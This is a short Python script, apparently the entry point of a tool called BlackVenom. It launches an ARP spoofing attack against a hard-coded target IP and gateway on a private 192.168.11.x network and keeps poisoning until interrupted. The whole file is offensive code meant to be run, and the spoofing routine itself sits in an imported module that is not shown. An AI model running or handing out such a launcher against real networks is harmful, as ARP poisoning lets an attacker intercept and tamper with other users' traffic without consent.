import time

from BlackVenom.BlackVenom import BlackVenom


def main():
    """
    Main function to execute ARP spoofing.

    The script will keep spoofing until interrupted (Ctrl+C).
    Once interrupted, it will restore the ARP tables of the affected devices.
    """
    spoofer = BlackVenom()

    target_ip = "192.168.11.128"
    gateway_ip = "192.168.11.2"

    spoofer.start_spoofing(target_ip, gateway_ip)

if __name__ == "__main__":
    main()